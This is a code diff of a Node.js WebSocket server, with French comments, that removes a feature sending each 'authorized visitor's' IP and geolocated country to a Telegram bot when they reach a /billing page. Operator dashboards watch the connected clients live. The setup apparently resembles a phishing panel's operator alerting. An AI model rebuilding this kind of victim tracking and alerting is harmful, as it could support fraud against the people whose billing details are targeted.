@@ -60,8 +60,6 @@ const wss = new WebSocket.Server({ server });
 // Stockage des connexions
 const clients = new Map();
 const dashboards = new Set();
-// Tracker des notifications par IP pour éviter les notifications multiples pour la même IP
-const ipNotificationTracker = new Map(); // Map<ip, {lastNotificationTime, notificationCount}>
 
 // Fonction pour extraire la vraie adresse IP du client
 function getClientIP(req) {
@@ -721,101 +719,8 @@ async function handleRegister(clientId, data) {
   client.ws.send(JSON.stringify(registrationResponse));
   console.log(`[handleRegister] ✅ Registration confirmation sent to ${clientId}`);
 
-  // Notifier Telegram pour les visiteurs autorisés UNIQUEMENT sur la page /billing
-  // IMPORTANT: Vérifier que la notification n'a pas déjà été envoyée pour éviter les doublons
-  // Ne pas envoyer si on a déjà skip l'enregistrement
-  // NE PAS envoyer si la page n'est pas /billing
-  const isBillingPage = data.page === '/billing' || client.current_page === '/billing';
-  const shouldNotify = client.role === 'client' && 
-                       !client.notificationSent && 
-                       !alreadyRegistered && 
-                       isBillingPage;
-  
-  if (shouldNotify) {
-    // Vérifier aussi qu'on n'a pas envoyé de notification récemment pour cette IP (protection contre les boucles)
-    // Utiliser un tracker global par IP, pas seulement par client
-    const now = Date.now();
-    const MIN_NOTIFICATION_INTERVAL = 300000; // 5 minutes minimum entre notifications pour la même IP
-    const ipTracker = ipNotificationTracker.get(client.ip) || { lastNotificationTime: 0, notificationCount: 0 };
-    const timeSinceLastNotification = now - ipTracker.lastNotificationTime;
-    
-    if (timeSinceLastNotification < MIN_NOTIFICATION_INTERVAL && ipTracker.lastNotificationTime > 0) {
-      console.log(`[handleRegister] ⚠️  Notification skipped - too soon since last notification for IP ${client.ip} (${Math.round(timeSinceLastNotification/1000)}s ago, ${ipTracker.notificationCount} total notifications for this IP)`);
-      // Ne pas envoyer de notification Telegram, mais continuer pour notifier les dashboards
-      // Marquer quand même comme envoyé pour éviter les tentatives répétées
-      client.notificationSent = true;
-      client.lastNotificationTime = now;
-    } else {
-      // Marquer IMMÉDIATEMENT que la notification va être envoyée pour éviter les doublons
-      // même si plusieurs appels à handleRegister arrivent en même temps
-      client.notificationSent = true;
-      client.lastNotificationTime = now;
-      
-      // Mettre à jour le tracker global par IP
-      ipNotificationTracker.set(client.ip, {
-        lastNotificationTime: now,
-        notificationCount: ipTracker.notificationCount + 1
-      });
-      
-      console.log(`[handleRegister] 🔔 Sending authorized visitor notification for client ${clientId} on page ${data.page || client.current_page} (IP: ${client.ip}, notification #${ipTracker.notificationCount + 1} for this IP)`);
-      
-      // Utiliser le pays déjà récupéré lors de la connexion (plus rapide)
-      let country = client.country;
-      
-      // Si le pays n'est pas disponible ou est "Unknown", faire UNE tentative rapide (sans délais longs)
-      if (!country || country === 'Unknown' || country === 'N/A') {
-        console.log(`[handleRegister] ⚠️  Country is ${country || 'missing'}, attempting quick fetch...`);
-        if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
-          try {
-            // UNE seule tentative rapide (pas de retries multiples pour éviter les délais)
-            country = await getCountryFromIP(client.ip);
-            console.log(`[handleRegister] 📍 Quick fetch result: ${country}`);
-            
-            if (country && country !== 'Unknown' && country !== 'Local') {
-              client.country = country;
-              console.log(`[handleRegister] ✅ Successfully fetched country: ${country}`);
-            } else {
-              // Si échec, utiliser l'IP comme fallback (pas de retries longs)
-              country = `IP: ${client.ip}`;
-              client.country = country;
-              console.log(`[handleRegister] ⚠️  Using IP as fallback: ${country}`);
-            }
-          } catch (error) {
-            console.error(`[handleRegister] ❌ Error fetching country:`, error);
-            country = `IP: ${client.ip}`;
-            client.country = country;
-          }
-        } else {
-          console.log(`[handleRegister] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
-          country = client.ip === '127.0.0.1' ? 'Local' : `Local Network (IP: ${client.ip})`;
-          client.country = country;
-        }
-      } else {
-        console.log(`[handleRegister] ✅ Using stored country: ${country}`);
-      }
-      
-      // Envoyer la notification avec le pays disponible (même si c'est l'IP en fallback)
-      await telegram.notifyAuthorizedVisitor({
-        ip: client.ip,
-        country: country || 'Unknown',
-      });
-      
-      console.log(`[handleRegister] ✅ Notification sent for client ${clientId}, country: ${country}`);
-      
-      // Si le pays est toujours "Unknown" ou utilise l'IP comme fallback, lancer une mise à jour en arrière-plan
-      if ((!country || country === 'Unknown' || country.startsWith('IP:') || country.startsWith('Unable to determine')) && client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
-        console.log(`[handleRegister] 🔄 Launching background country update for client ${clientId}`);
-        // Mettre à jour le pays en arrière-plan (ne pas attendre)
-        updateCountryInBackground(clientId).catch(err => {
-          console.error(`[handleRegister] ❌ Error updating country in background for ${clientId}:`, err);
-        });
-      }
-    }
-  } else if (client.role === 'client' && client.notificationSent) {
-    console.log(`[handleRegister] ⚠️  Notification already sent for client ${clientId}, skipping Telegram notification...`);
-  } else if (client.role === 'client' && !isBillingPage) {
-    console.log(`[handleRegister] ⚠️  Client ${clientId} is on page '${data.page || client.current_page}', not /billing - skipping notification`);
-  }
+  // Notification des visiteurs autorisés - DÉSACTIVÉE
+  // La fonctionnalité de notification Telegram pour les visiteurs a été supprimée
 
   // Notifier les dashboards (TOUJOURS, même si la notification Telegram a été skip)
   const notificationType = client.role === 'client' ? 'client_registered' : 'dashboard_connected';
